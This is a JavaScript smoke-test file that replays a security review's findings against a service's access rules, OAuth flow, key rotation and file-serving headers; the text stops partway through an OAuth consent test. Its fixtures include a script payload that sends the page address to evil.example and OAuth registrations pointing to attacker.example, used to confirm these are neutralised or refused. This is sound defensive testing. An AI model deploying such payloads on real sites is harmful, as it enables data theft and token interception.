// tools/smoke/s26-review.mjs — sprint 3, G2: the independent review's findings, each as the attack that found it, run against
// the fixed door. Self-contained: two projects of its own (r26a, r26b) and five people (a member of each, a member seated on
// both, a Partner seated on r26a, a Partner and a member seated nowhere), each project holding a marked contribution
// (R26AMARK, R26BMARK) that only its own readers may ever see.
//   · H1 Activity (GET /audit) reads under the one project rule: a member of the other project, a Partner with and without a
//     seat, a member seated nowhere, a plain key, a signed-in cookie, a key in the address and an OAuth grant each read only
//     what that rule gives them; the owner keeps the org rollup.
import { createHash, randomBytes } from "node:crypto";
import { smoke, expect, brief, http, mcp, ownerKey, control, BASE, contribute, sessionPath, unbased, fileParts } from "./lib.mjs";

// S26_TAG: a second run against a kept worker takes its own projects and people (the smoke itself runs it once, untagged)
const TAG = String(process.env.S26_TAG || "").replace(/[^a-z0-9]/g, "");
const A = "r26a" + TAG, B = "r26b" + TAG, AM = "R26AMARK", BM = "R26BMARK";
const r = { p: {} };
const keyOf = (text) => (text.match(/API key\): ([0-9a-f]{40})/) || [])[1] || null;
const invite = async (name, email, role, projects) => {
  const res = await http("POST", "/control", { key: ownerKey, form: [["action", "add-person"], ["name", name], ["email", email], ["role", role], ["seatsChosen", "1"], ...projects.map((p) => ["projectKey", p])] });
  const key = keyOf(res.text);
  if (!key) throw new Error(`invite ${email}: no key (HTTP ${res.status})`);
  return { key, email };
};
// raw(method, path, headers, body) -> the answer with its headers, nothing added but what the caller names
export async function raw(method, path, headers = {}, body) {
  const res = await fetch(BASE + await sessionPath(headers.cookie, path), { method, headers: { ...(body !== undefined && typeof body !== "string" ? { "content-type": "application/json" } : {}), ...headers },
    body: body === undefined ? undefined : typeof body === "string" ? body : JSON.stringify(body), redirect: "manual" });
  const text = await unbased(await res.text());   // the org base off its paths (sprint 7, 7.4: lib.mjs unbased)
  let json = null; try { json = JSON.parse(text); } catch { json = null; }
  return { status: res.status, json, text, headers: res.headers };
}
// signIn(email, key) -> a session token (the cookie's value)
const signIn = async (email, key) => {
  const res = await http("POST", "/login", { body: { email, password: key, device: "smoke-s26" } });
  if (!res.json || !res.json.token) throw new Error(`POST /login ${email}: ${res.status} ${brief(res.json)}`);
  return res.json.token;
};
const cookie = (tok) => `__Host-ar_session=${encodeURIComponent(tok)}`;
const b64u = (b) => b.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
// oauthGrant(email, key, { redirect }) -> { access, refresh, client } — a client registers itself, the person signs in on the
// consent page (the key is also the passphrase), the code is exchanged with PKCE
export async function oauthGrant(email, key, { redirect = "https://client.example/cb", name = "Smoke client" } = {}) {
  const reg = await raw("POST", "/oauth/register", { "content-type": "application/json" }, JSON.stringify({ client_name: name, redirect_uris: [redirect], token_endpoint_auth_method: "none", grant_types: ["authorization_code", "refresh_token"], response_types: ["code"] }));
  if (!reg.json || !reg.json.client_id) throw new Error(`register: ${reg.status} ${brief(reg.json)}`);
  const verifier = b64u(randomBytes(32)), challenge = b64u(createHash("sha256").update(verifier).digest());
  const q = new URLSearchParams({ response_type: "code", client_id: reg.json.client_id, redirect_uri: redirect, scope: "mcp:read mcp:write", state: "s26", code_challenge: challenge, code_challenge_method: "S256" });
  const page = await raw("GET", "/oauth/authorize?" + q, { accept: "text/html" });
  const m = /name="oauth_req" value="([^"]+)"/.exec(page.text);
  if (!m) throw new Error(`authorize: ${page.status} no request field`);
  const oreq = m[1].replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, "&");
  const post = await raw("POST", "/oauth/authorize?" + q, { "content-type": "application/x-www-form-urlencoded" }, new URLSearchParams({ email, password: key, oauth_req: oreq }).toString());
  const loc = post.headers.get("location") || "";
  const code = loc ? new URL(loc).searchParams.get("code") : null;
  if (!code) throw new Error(`authorize POST: ${post.status} ${loc.replace(/code=[^&]+/, "code=<code>")}`);
  const tok = await raw("POST", "/oauth/token", { "content-type": "application/x-www-form-urlencoded" }, new URLSearchParams({ grant_type: "authorization_code", code, redirect_uri: redirect, client_id: reg.json.client_id, code_verifier: verifier }).toString());
  if (!tok.json || !tok.json.access_token) throw new Error(`token: ${tok.status} ${brief(tok.json)}`);
  return { access: tok.json.access_token, refresh: tok.json.refresh_token, client: reg.json.client_id, page: page.text };
}
// whoamiWith(bearer) -> the MCP whoami answer for any bearer (a key, a session token or an OAuth access token), or the HTTP status
export async function whoamiWith(bearer) {
  const res = await raw("POST", "/mcp", { authorization: "Bearer " + bearer, "content-type": "application/json", accept: "application/json, text/event-stream" }, { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "whoami", arguments: {} } });
  const t = res.json && res.json.result && res.json.result.content && res.json.result.content[0] && res.json.result.content[0].text;
  let out = null; try { out = JSON.parse(t); } catch { out = null; }
  return { status: res.status, person: out && out.person };
}
const marks = (text) => [AM, BM].filter((m) => String(text || "").includes(m));

smoke("review · setup: two projects, a member of each, one of both, a Partner with and one without a seat, a member seated nowhere; a marked contribution in each", async () => {
  await control({ action: "add-project", key: A, name: "R26 A" });
  await control({ action: "add-project", key: B, name: "R26 B" });
  r.p.mA = await invite("R26 mA", `ma${TAG}@r26.local`, "member", [A]);
  r.p.mB = await invite("R26 mB", `mb${TAG}@r26.local`, "member", [B]);
  r.p.mAB = await invite("R26 mAB", `mab${TAG}@r26.local`, "member", [A, B]);
  r.p.pA = await invite("R26 pA", `pa${TAG}@r26.local`, "partner", [A]);
  r.p.p0 = await invite("R26 p0", `p0${TAG}@r26.local`, "partner", []);
  r.p.m0 = await invite("R26 m0", `m0${TAG}@r26.local`, "member", []);
  const a = await contribute(r.p.mA.key, { project: A, lane: "leader", kind: "note", what: `${AM} the alpha side's own note`, why: "s26 marker", touches: ["decisions"] });
  const b = await contribute(r.p.mB.key, { project: B, lane: "leader", kind: "note", what: `${BM} the beta side's own note`, why: "s26 marker", touches: ["decisions"] });
  expect(a.out && a.out.id && b.out && b.out.id, () => brief({ a: a.out, b: b.out }));
  r.a = a.out.id; r.b = b.out.id;
  return `${A} and ${B}; six people; ${r.a} in ${A}, ${r.b} in ${B}`;
});

smoke("review · H1 Activity reads under the one project rule: every caller shape sees only its own project's trail; the owner the rollup", async () => {
  const got = {};
  const audit = async (label, headers, path = "/audit") => { const res = await raw("GET", path, { accept: "application/json", ...headers }); got[label] = `${res.status}:${marks(res.text).join("+") || "-"}`; return res; };
  const bearer = (k) => ({ authorization: "Bearer " + k });
  await audit("mA key", bearer(r.p.mA.key));
  await audit("mB key", bearer(r.p.mB.key));
  await audit("mAB key", bearer(r.p.mAB.key));
  await audit("mAB key ?project=r26b", bearer(r.p.mAB.key), `/audit?project=${B}`);
  await audit("mB key ?project=r26a", bearer(r.p.mB.key), `/audit?project=${A}`);
  await audit("pA key", bearer(r.p.pA.key));
  await audit("p0 key", bearer(r.p.p0.key));
  await audit("m0 key", bearer(r.p.m0.key));
  await audit("mB cookie", { cookie: cookie(await signIn(r.p.mB.email, r.p.mB.key)) });
  await audit("p0 cookie", { cookie: cookie(await signIn(r.p.p0.email, r.p.p0.key)) });
  await audit("mB ?k=", {}, `/audit?k=${encodeURIComponent(r.p.mB.key)}`);
  await audit("p0 ?k=", {}, `/audit?k=${encodeURIComponent(r.p.p0.key)}`);
  const g = await oauthGrant(r.p.mB.email, r.p.mB.key);
  await audit("mB OAuth bearer", bearer(g.access));
  await audit("owner ?project=r26a", bearer(ownerKey), `/audit?project=${A}`);
  await audit("owner ?project=r26b", bearer(ownerKey), `/audit?project=${B}`);
  const want = {
    "mA key": `200:${AM}`, "mB key": `200:${BM}`, "mAB key ?project=r26b": `200:${BM}`, "mB key ?project=r26a": "403:-", "pA key": `200:${AM}`,
    "p0 key": "200:-", "m0 key": "200:-", "mB cookie": `200:${BM}`, "p0 cookie": "200:-", "mB OAuth bearer": "401:-",
    "owner ?project=r26a": `200:${AM}`, "owner ?project=r26b": `200:${BM}`,
  };
  const bad = Object.entries(want).filter(([k, v]) => got[k] !== v).map(([k, v]) => `${k}: ${got[k]} (want ${v})`);
  // mAB unnamed reads ONE of its two projects (its first), never both
  if (!/^200:(R26AMARK|R26BMARK)$/.test(got["mAB key"])) bad.push(`mAB key: ${got["mAB key"]} (want one project's)`);
  // a key in the address never reads another project's trail, whatever it answers
  for (const k of ["mB ?k=", "p0 ?k="]) if (got[k].includes(AM) || (k.startsWith("p0") && got[k].includes(BM))) bad.push(`${k}: ${got[k]}`);
  expect(!bad.length, () => bad.join(" | "));
  return Object.entries(got).map(([k, v]) => `${k} ${v}`).join(" · ");
});

// sprint 12 (12.5): Activity across every project — GET /audit?all=1 (src/activity.js activityAcross) and its door twin,
// changes {org: true, list: true} (REST GET /changes?org=1&list=1 and the MCP tool): each caller lists exactly the projects it
// may read; a project outside them is refused, nothing listed
smoke("review · 12.5 Activity across every project: each caller lists the projects it may read, the page and the door alike; another project refused", async () => {
  const got = {}, bad = [];
  const bearer = (k) => ({ authorization: "Bearer " + k });
  const page = async (label, key, q = "") => { const res = await raw("GET", `/audit?all=1${q}`, { accept: "text/html", ...bearer(key) });
    got[label] = `${res.status}:${marks(res.text).join("+") || "-"}`; if (res.status === 200 && !/data-scope="all"/.test(res.text)) bad.push(`${label}: not the all-projects page`); return res; };
  await page("owner", ownerKey); await page("mA", r.p.mA.key); await page("mB", r.p.mB.key); await page("mAB", r.p.mAB.key);
  await page("pA", r.p.pA.key); await page("p0", r.p.p0.key); await page("m0", r.p.m0.key);
  await page("mAB in=r26b", r.p.mAB.key, `&in=${B}`); await page("mA in=r26b", r.p.mA.key, `&in=${B}`);
  const want = { owner: `200:${AM}+${BM}`, mA: `200:${AM}`, mB: `200:${BM}`, mAB: `200:${AM}+${BM}`, pA: `200:${AM}`, p0: "200:-", m0: "200:-", "mAB in=r26b": `200:${BM}`, "mA in=r26b": "403:-" };
  for (const [k, v] of Object.entries(want)) if (got[k] !== v) bad.push(`page ${k}: ${got[k]} (want ${v})`);
  // the page's row: its project by name, its link in its project
  const own = await raw("GET", `/audit?all=1&in=${B}`, { accept: "text/html", ...bearer(ownerKey) });
  if (!/R26 B · /.test(own.text) || !new RegExp(`/contribution/${r.b}\\?page=1&amp;project=${B}`).test(own.text)) bad.push("the owner's row does not name R26 B or link the contribution in its project");
  // the door's twin, REST and MCP: the same projects, the same refusal
  const rest = async (key, q = "") => (await raw("GET", `/changes?org=1&list=1${q}`, { accept: "application/json", ...bearer(key) }));
  const restProj = (res) => [...new Set(((res.json || {}).items || []).map((i) => i.slug))].filter((p) => p === A || p === B).sort().join("+") || "-";
  const rAB = await rest(r.p.mAB.key), rA = await rest(r.p.mA.key), rP0 = await rest(r.p.p0.key), rForb = await rest(r.p.mA.key, `&projects=${B}`);
  if (restProj(rAB) !== `${A}+${B}` || restProj(rA) !== A || restProj(rP0) !== "-" || rForb.status !== 403 || (rForb.json || {}).error !== "project_forbidden")
    bad.push(`REST: mAB ${restProj(rAB)} · mA ${restProj(rA)} · p0 ${restProj(rP0)} · mA projects=${B} ${rForb.status} ${(rForb.json || {}).error}`);
  const mine = ((rAB.json || {}).items || []).find((i) => i.id === r.b);
  if (!mine || !mine.by || mine.by.name !== "R26 mB" || !["landed", "with", "decided", "needs"].includes(mine.state) || mine.door !== "mcp") bad.push(`REST item ${r.b}: ${brief(mine)}`);
  const m = await mcp(r.p.mAB.key, "changes", { org: true, list: true, projects: [B] });
  const mProj = [...new Set(((m.out || {}).items || []).map((i) => i.slug))].join("+");
  if (!m.out || m.out.list !== true || mProj !== B) bad.push(`MCP changes {org, list, projects:[${B}]}: list ${m.out && m.out.list} projects ${mProj || "-"}`);
  const mForb = await mcp(r.p.mA.key, "changes", { org: true, list: true, projects: [B] });
  if (!mForb.out || mForb.out.error !== "project_forbidden") bad.push(`MCP mA projects:[${B}]: ${brief(mForb.out)}`);
  expect(!bad.length, () => bad.join(" | "));
  return Object.entries(got).map(([k, v]) => `${k} ${v}`).join(" · ") + ` · REST and MCP: the same projects, ${B} refused to mA`;
});

smoke("review · H2 the cron's batch report: one per project, owned by no person, read under its project's rule (REST and read_file)", async () => {
  // mA files first (the old code made the oldest filer the report's owner), then mB in the other project, then pA
  const a = await contribute(r.p.mA.key, { project: A, lane: "leader", kind: "note", what: `${AM} h2 first, by the alpha member`, why: "s26 H2", touches: ["decisions"] });
  const b = await contribute(r.p.mB.key, { project: B, lane: "leader", kind: "note", what: `${BM} h2 private beta work`, why: "s26 H2", touches: ["decisions"] });
  const c = await contribute(r.p.pA.key, { project: A, lane: "leader", kind: "note", what: `${AM} h2 by the alpha Partner`, why: "s26 H2", touches: ["decisions"] });
  const ids = [a, b, c].map((x) => x.out && x.out.id);
  expect(ids.every(Boolean), () => brief([a.out, b.out, c.out]));
  // the cron's own function, run by the owner's POST /backfill until these three carry a report (100 rows a call)
  const reportOf = async (id) => ((await http("GET", `/contribution/${id}`, { key: ownerKey })).json || {}).report || null;
  let calls = 0, mixed = 0;
  for (; calls < 60 && !(await reportOf(ids[2])); calls++) {
    const bf = await http("POST", "/backfill", { key: ownerKey, body: {} });
    expect(bf.status === 200, () => `POST /backfill ${bf.status} ${brief(bf.json)}`);
    if (!bf.json.backfilled) break;
  }
  const [ra, rb, rc] = await Promise.all(ids.map(reportOf));
  expect(ra && rb && rc && ra === rc && ra !== rb, () => `reports ${ra} ${rb} ${rc} after ${calls} call(s)`);
  // the owner reads each: one project's rows each, the artifact stamped with its project
  for (const [rep, mine, other] of [[ra, AM, BM], [rb, BM, AM]]) {
    const o = await raw("GET", `/artifact/${rep}`, { authorization: "Bearer " + ownerKey });
    if (!(o.status === 200 && o.text.includes(mine) && !o.text.includes(other))) mixed++;
  }
  const look = {};
  for (const [who, rep] of [["mA", ra], ["pA", ra], ["mB", rb], ["mB", ra], ["mA", rb], ["pA", rb], ["p0", ra], ["m0", ra], ["mAB", rb]]) {
    const g = await raw("GET", `/artifact/${rep}`, { authorization: "Bearer " + r.p[who].key });
    const t = await mcp(r.p[who].key, "read_file", { id: rep });
    look[`${who}:${rep === ra ? "A" : "B"}`] = `${g.status}/${t.out && t.out.error ? t.out.error : "read"}`;
  }
  const want = { "mA:A": "200/read", "pA:A": "200/read", "mB:B": "200/read", "mB:A": "404/not_found", "mA:B": "404/not_found", "pA:B": "404/not_found", "p0:A": "404/not_found", "m0:A": "404/not_found", "mAB:B": "200/read" };
  const bad = Object.entries(want).filter(([k, v]) => look[k] !== v).map(([k, v]) => `${k} ${look[k]} (want ${v})`);
  expect(!mixed && !bad.length, () => `mixed reports ${mixed} · ${bad.join(" | ")}`);
  return `${calls} backfill call(s): ${A}'s report and ${B}'s apart, neither holds the other's mark; ${Object.entries(look).map(([k, v]) => `${k} ${v}`).join(" · ")}`;
});

// personIdOf(email) -> the person's id (GET /control/people, the owner's)
const personIdOf = async (email) => (((await http("GET", "/control/people?all=1", { key: ownerKey })).json || {}).people || []).find((p) => p.email === email)?.id;
const refreshWith = (g) => raw("POST", "/oauth/token", { "content-type": "application/x-www-form-urlencoded" }, new URLSearchParams({ grant_type: "refresh_token", refresh_token: g.refresh, client_id: g.client }).toString());

smoke("review · M1 a key rotation (the admin's rotate-key, the person's rotate-my-key) ends the person's OAuth grants: the old access token and the refresh token both fail", async () => {
  const p = r.p.mB, id = await personIdOf(p.email);
  expect(id, "no id for mB");
  // the admin rotates: a grant made before it dies, access and refresh alike
  const g1 = await oauthGrant(p.email, p.key);
  const before = await whoamiWith(g1.access);
  const rot = await control({ action: "rotate-key", personId: id });
  const nk = (rot.text.match(/shown again: ([0-9a-f]{40})/) || [])[1] || null;
  expect(before.status === 200 && before.person && nk, () => `before ${before.status} ${before.person}; rotate ${rot.status} new key ${!!nk}`);
  p.key = nk; p.pass = nk;   // rotate-key sets the key AND the passphrase to the new value
  const a1 = await whoamiWith(g1.access), f1 = await refreshWith(g1);
  // the person rotates their own key on /profile: the same
  const g2 = await oauthGrant(p.email, p.pass);
  const b2 = await whoamiWith(g2.access);
  const mine = await http("POST", "/profile", { key: p.key, body: { action: "rotate-my-key", current: p.key } });
  expect(b2.status === 200 && mine.status === 200 && mine.json && mine.json.key, () => `grant 2 ${b2.status}; rotate-my-key ${mine.status} ${brief(mine.json)}`);
  p.key = mine.json.key;   // rotate-my-key moves the key only: the passphrase stays
  const a2 = await whoamiWith(g2.access), f2 = await refreshWith(g2);
  // the new key still works; a grant made with it works
  const g3 = await oauthGrant(p.email, p.pass);
  const a3 = await whoamiWith(g3.access);
  expect(a1.status === 401 && f1.status === 400 && a2.status === 401 && f2.status === 400 && a3.status === 200,
    () => `admin rotate: access ${a1.status} refresh ${f1.status} · own rotate: access ${a2.status} refresh ${f2.status} · a new grant ${a3.status}`);
  r.g3 = g3;
  return `rotate-key: the old access token ${a1.status}, its refresh ${f1.status}; rotate-my-key: ${a2.status}, ${f2.status}; a grant made after it: ${a3.status}`;
});

smoke("review · M1 a grant is bound to the credentials it was made with: changed under it (the grant store untouched), its token is refused at the door", async () => {
  const { SMOKE_D1_DB: db, SMOKE_D1_CFG: cfg, SMOKE_D1_PERSIST: persist } = process.env;
  expect(db && cfg && persist && r.g3, "SMOKE_D1_* not set (tools/smoke.sh sets them), or the case before did not leave a grant");
  const before = await whoamiWith(r.g3.access);
  // the passphrase hash moved by SQL alone: no rotate, no revoke — only the bound stamp can refuse the token now
  const { execFileSync } = await import("node:child_process");
  execFileSync("npx", ["--no-install", "wrangler", "d1", "execute", db, "--config", cfg, "--local", "--persist-to", persist, "--command", `UPDATE people SET pass_hash = pass_hash || 'x' WHERE email = '${r.p.mB.email}'`], { stdio: "ignore" });
  const after = await whoamiWith(r.g3.access);
  expect(before.status === 200 && after.status === 401, () => `before ${before.status}, after ${after.status}`);
  return `a grant's token: ${before.status} while its credentials stand, ${after.status} once the passphrase changed under it (the store still held the grant)`;
});

smoke("review · M2 a saved file is an inert document: no script, nothing loaded from anywhere, nosniff; a key in the address signs no one in, on any door; /docs gives no such advice", async () => {
  const leak = `<!doctype html><p>quarterly</p><script>new Image().src="https://evil.example/x.png?u="+encodeURIComponent(location.href)</script><img src="https://evil.example/p.png">`;
  const pub = await mcp(r.p.mA.key, "save_file", { content: leak, title: "s26 public html", group: "reports", public: true });
  const priv = await mcp(r.p.mA.key, "save_file", { content: "<p>private</p>", title: "s26 private", group: "notes" });
  expect(pub.out && pub.out.id && priv.out && priv.out.id, () => brief({ pub: pub.out, priv: priv.out }));
  const a = await raw("GET", `/artifact/${pub.out.id}`, { accept: "text/html" });
  const csp = a.headers.get("content-security-policy") || "", sniff = a.headers.get("x-content-type-options");
  const dirs = Object.fromEntries(csp.split(";").map((d) => d.trim()).filter(Boolean).map((d) => { const [k, ...v] = d.split(/\s+/); return [k, v.join(" ")]; }));
  const inert = "sandbox" in dirs && !/allow-scripts|allow-same-origin|allow-forms|allow-top-navigation/.test(dirs.sandbox) && dirs["default-src"] === "'none'" && !/https?:|\*/.test(csp) && dirs["form-action"] === "'none'" && sniff === "nosniff";
  // a key in the address: the author's own private file, and every kind of door, answer as signed out
  const k = `k=${encodeURIComponent(r.p.mA.key)}`;
  const byKey = {};
  for (const p of [`/artifact/${priv.out.id}?${k}`, `/artifact/${priv.out.id}?meta=1&${k}`, `/home?${k}`, `/audit?${k}`, `/library?${k}`, `/doc/start-here.md?${k}`, `/capabilities?${k}`, `/formats?${k}`, `/control?${k}`, `/artifacts?${k}`]) {
    byKey[p.split("?")[0].replace(priv.out.id, ":id")] = (await raw("GET", p, { accept: "application/json" })).status;
  }
  const own = await raw("GET", `/artifact/${priv.out.id}`, { authorization: "Bearer " + r.p.mA.key });
  const view = await raw("GET", `/view?src=${encodeURIComponent("/artifact/" + priv.out.id)}&${k}`, { authorization: "Bearer " + r.p.mA.key, accept: "text/html" });
  const docs = await raw("GET", "/docs", { accept: "text/html" });
  const notSigned = Object.entries(byKey).filter(([, st]) => st !== 401);
  expect(inert && !notSigned.length && own.status === 200 && view.status === 200 && !/[?&]k=/.test((/<iframe[^>]*src="([^"]*)"/.exec(view.text) || [])[1] || "x?k=") && !/\?k=/.test(docs.text),
    () => `csp "${csp}" nosniff ${sniff} · ?k= answers ${JSON.stringify(byKey)} · own file by Bearer ${own.status} · /view ${view.status} · /docs ?k= advice ${/\?k=/.test(docs.text)}`);
  return `a public HTML file: "${csp}", nosniff; a key in the address: ${Object.keys(byKey).length} doors all 401; the author's Bearer reads it (${own.status}); /view's frame carries no key; /docs no ?k= advice`;
});

smoke("review · the eval mark hides nothing real: a member's marked write on a real project is refused on every door, nothing written; a test seat's, or one on an eval project, files", async () => {
  // the owner gives the project a check and an open question to aim at (unmarked, real)
  const fx = await mcp(ownerKey, "preview", { project: A, items: [{ kind: "check", op: "upsert", data: { id: "AC.r26.1", title: "R26 check", refs: [] } },
    { kind: "question", op: "upsert", data: { qid: "Q-r26-1", question: "R26 which way?", status: "open", options: [{ what: "left" }, { what: "right" }] } }] });
  await mcp(ownerKey, "save_knowledge", { previewId: fx.out.previewId, items: [{ kind: "check", op: "upsert", data: { id: "AC.r26.1", title: "R26 check", refs: [] } }, { kind: "question", op: "upsert", data: { qid: "Q-r26-1", question: "R26 which way?", status: "open", options: [{ what: "left" }, { what: "right" }] } }] });
  const ledger = async () => ((await mcp(ownerKey, "read", { project: A, kind: "contribution", eval: true, limit: 100 })).out.items || []).length;
  const before = await ledger();
  const k = r.p.mA.key, refused = {};
  const err = (x) => (x && x.out && (x.out.error || (x.out.items && x.out.items.map((i) => i.verdict).join(",")))) || "?";
  refused.preview = err(await mcp(k, "preview", { project: A, eval: true, items: [{ contribution: { lane: "leader", kind: "note", what: "R26 HIDDENWRITE", why: "w" } }] }));
  refused.knowledge = err(await mcp(k, "preview", { project: A, eval: true, items: [{ kind: "goal", op: "upsert", data: { id: "r26-hidden", title: "R26 HIDDENWRITE goal" } }] }));
  refused.submit_grade = err(await mcp(k, "submit_grade", { project: A, checkId: "AC.r26.1", verdict: "refused", proof: "exit 1", eval: true }));
  refused["POST /grade"] = (await http("POST", "/grade", { key: k, body: { project: A, checkId: "AC.r26.1", verdict: "refused", proof: "exit 1", eval: true } })).json?.error;
  refused.respond = err(await mcp(k, "respond", { project: A, qid: "Q-r26-1", option: 0, eval: true }));
  refused.save_file = err(await mcp(k, "save_file", { content: "x", title: "R26 hidden file", group: "notes", eval: true }));
  refused.ask = err(await mcp(k, "ask", { project: A, question: "R26 HIDDENWRITE ask", eval: true }));
  refused.wrap_up = err(await mcp(k, "wrap_up", { project: A, summary: "R26 HIDDENWRITE wrap", eval: true }));
  const after = await ledger();
  const grade = (await mcp(ownerKey, "read", { project: A, ref: "check/AC.r26.1" })).out;
  const bad = Object.entries(refused).filter(([, v]) => v !== "eval_mark_refused");
  // a test seat's marked write files; so does a member's on an eval project
  const evSeat = await http("POST", "/control", { key: ownerKey, form: [["action", "add-person"], ["name", "R26 Eval"], ["email", `evs${TAG}@r26.local`], ["role", "member"], ["eval", "1"], ["seatsChosen", "1"], ["projectKey", A]] });
  const evKey = keyOf(evSeat.text);
  const evPv = evKey ? await mcp(evKey, "preview", { project: A, eval: true, items: [{ contribution: { lane: "leader", kind: "note", what: "R26 a test seat's marked note", why: "w" } }] }) : null;
  const E = "r26e" + TAG;
  await mcp(ownerKey, "create_project", { key: E, name: "R26 eval", eval: true });
  const ids = (((await http("GET", "/control/people?all=1", { key: ownerKey })).json || {}).people || []).find((p) => p.email === r.p.mA.email);
  await control({ action: "grant-seat", personId: ids && ids.id, projectKey: E });
  const onEval = await mcp(k, "preview", { project: E, eval: true, items: [{ contribution: { lane: "leader", kind: "note", what: "R26 marked on an eval project", why: "w" } }] });
  expect(!bad.length && after === before && !JSON.stringify(grade).includes('"refused"') && evPv && evPv.out && evPv.out.previewId && onEval.out && onEval.out.previewId,
    () => `refused: ${JSON.stringify(refused)} · ledger ${before} -> ${after} · test seat ${brief(evPv && evPv.out)} · eval project ${brief(onEval.out)}`);
  return `a member's marked write on ${A}: ${Object.keys(refused).join(", ")} each eval_mark_refused, the ledger unchanged (${after}); a test seat's marked preview stores (${evPv.out.previewId}); a member's on the eval project ${E} too`;
});

smoke("review · a clientRef names its content on every door: the same content again is a replay, other content under it is refused saying so, never 'filed' and never 'unchanged'", async () => {
  const k = r.p.mA.key, t = TAG || "x";
  // pf: preview, then each part with its write tool (sprint 19), only: "ready" when something is not
  const pf = async (args) => { const pv = (await mcp(k, "preview", args)).out || {}; const f = pv.previewId ? (await fileParts((n, a) => mcp(k, n, a), pv, args.items, pv.notReady ? { only: "ready" } : {})).out : null;
    return { v: (pv.items || []).map((i) => i.verdict + (i.refusal ? ":" + i.refusal.error : "")).join(","), f: f && (f.items || []).map((i) => i.filed && i.filed.status).join(",") }; };
  const C = (what) => ({ contribution: { lane: "leader", kind: "note", what, why: "s26 cref", touches: ["decisions"], clientRef: `r26c-${t}` } });
  const Gr = (verdict) => ({ grade: { checkId: "AC.r26.1", verdict, proof: verdict === "proven" ? "npm test -> exit 0, 3 passing" : "npm test -> exit 1, 0 passing", clientRef: `r26g-${t}` } });
  const K = (title) => ({ kind: "goal", op: "upsert", data: { id: `r26-cref-${t}`, title } });
  const out = {
    c1: await pf({ project: A, items: [C("R26 one")] }), c2: await pf({ project: A, items: [C("R26 one")] }), c3: await pf({ project: A, items: [C("R26 CHANGED")] }),
    // sprint 19: a grade is never a preview's — refused naming submit_grade, nothing filed (its clientRef rule: s1-s3 below)
    g1: await pf({ project: A, items: [Gr("proven")] }),
    k1: await pf({ project: A, items: [K("R26 goal one")], clientRef: `r26k-${t}` }), k3: await pf({ project: A, items: [K("R26 goal CHANGED")], clientRef: `r26k-${t}` }),
  };
  const sg = async (verdict) => (await mcp(k, "submit_grade", { project: A, checkId: "AC.r26.1", verdict, proof: "exit 0", clientRef: `r26s-${t}` })).out;
  const s1 = await sg("proven"), s2 = await sg("proven"), s3 = await sg("refused");
  const rest = await http("POST", "/grade", { key: k, body: { project: A, checkId: "AC.r26.1", verdict: "incomplete", proof: "exit 0", clientRef: `r26s-${t}` } });
  // W1 (sprint 5): a wrap_up answer names a question of the project — QR261 must exist, or the answer is said back unknown
  const qItems = [{ kind: "question", op: "upsert", data: { qid: "QR261", question: "R26: left or right?", status: "open", whoOwes: "owner", options: [{ what: "left" }, { what: "right" }] } }];
  const qPv = (await mcp(ownerKey, "preview", { project: A, items: qItems })).out || {};
  await mcp(ownerKey, "save_knowledge", { previewId: qPv.previewId, items: qItems });
  const W = (answer) => ({ project: A, summary: "s26 wrap", clientRef: `r26w-${t}`, answers: [{ card: "QR261", answer }] });
  const w1 = await mcp(k, "wrap_up", W("left, because")), w3 = await mcp(k, "wrap_up", W("right, CHANGED"));
  const goal = (await mcp(ownerKey, "read", { project: A, ref: `goal/r26-cref-${t}` })).out;
  const want = { c1: "files|filed", c2: "unchanged|unchanged", c3: "refused:client_ref_taken|left", g1: "refused:wrong_tool|",
    k1: "files|filed", k3: "refused:client_ref_taken|left" };
  const bad = Object.entries(want).filter(([n, v]) => `${out[n].v}|${out[n].f}` !== v).map(([n, v]) => `${n} ${out[n].v}|${out[n].f} (want ${v})`);
  const wrapErr = JSON.stringify(w3.out || {});
  expect(!bad.length && s1.transmission && s2.transmission === s1.transmission && s3.error === "client_ref_taken" && rest.json && rest.json.error === "client_ref_taken"
    && goal.item && goal.item.title === "R26 goal one" && w1.out && w1.out.receipt && w1.out.receipt.filedAnswers === 1 && w3.out && w3.out.receipt && w3.out.receipt.filedAnswers === 0 && /QR261 \(client_ref_taken\)/.test(wrapErr),
    () => `${bad.join(" | ")} · submit_grade ${s1.transmission} / ${s2.transmission} / ${brief(s3)} · POST /grade ${rest.status} ${brief(rest.json)} · goal ${brief(goal.item && goal.item.title)} · wrap_up ${wrapErr.slice(0, 300)}`);
  return `contribution (preview/file_contribution), grade (submit_grade, POST /grade; a preview refuses it, wrong_tool), knowledge under a batch clientRef, and a wrap-up's card answer: the same content replays, other content is refused client_ref_taken; the goal stays "R26 goal one"`;
});

smoke("review · the OAuth consent names where the code goes (the redirect's host, the whole address on hover) and what is asked; a client's name is what it calls itself; a registration with a redirect that is not https (or this computer) is refused", async () => {
  const reg = async (uris) => raw("POST", "/oauth/register", { "content-type": "application/json" }, JSON.stringify({ client_name: "Claude", redirect_uris: uris, token_endpoint_auth_method: "none", grant_types: ["authorization_code"], response_types: ["code"] }));
  const codes = {};
  for (const [label, uris] of [["http elsewhere", ["http://evil.example/cb"]], ["a custom scheme", ["cursor://anysphere/cb"]], ["one good, one bad", ["https://ok.example/cb", "http://evil.example/cb"]],
    ["https", ["https://attacker.example/callback/path"]], ["localhost", ["http://localhost:33418/callback"]], ["127.0.0.1", ["http://127.0.0.1:5000/cb"]]]) {
    const r0 = await reg(uris); codes[label] = `${r0.status}${r0.json && r0.json.error ? " " + r0.json.error : ""}`;
    if (label === "https") codes._client = r0.json && r0.json.client_id;
  }
  const q = new URLSearchParams({ response_type: "code", client_id: codes._client, redirect_uri: "https://attacker.example/callback/path", scope: "mcp:read mcp:write", state: "s", code_challenge: "x".repeat(43), code_challenge_method: "S256" });
  const page = await raw("GET", "/oauth/authorize?" + q, { accept: "text/html" });
  const host = (/<b data-redirect-host title="([^"]*)">([^<]*)<\/b>/.exec(page.text) || []);
  const lede = /calls itself “Claude”: that name is its own claim/.test(page.text) && !/>Claude is asking/.test(page.text) && !/data-client-logo/.test(page.text);   // 21.P: a name with another host gets no logo
  const scopes = (/<span data-scopes>([^<]*)<\/span>/.exec(page.text) || [])[1] || "";
  delete codes._client;
  const want = { "http elsewhere": "400 invalid_redirect_uri", "a custom scheme": "400 invalid_redirect_uri", "one good, one bad": "400 invalid_redirect_uri", https: "201", localhost: "201", "127.0.0.1": "201" };
